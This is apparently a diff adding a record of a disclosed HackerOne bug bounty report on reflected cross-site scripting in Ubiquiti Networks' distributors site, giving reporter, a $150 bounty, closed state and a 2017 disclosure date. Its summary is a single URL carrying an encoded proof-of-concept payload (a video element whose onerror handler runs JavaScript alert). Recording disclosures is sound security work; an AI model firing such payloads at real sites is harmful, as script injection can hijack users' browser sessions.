@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/219170
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/linkks
+ReportedTo:Ubiquiti Networks(ubnt)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:20.05.2017 10:44:31
+
+Summary:
+
+https://distributors.ubnt.com.cn/combine/;%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E
+
+FORK FF 
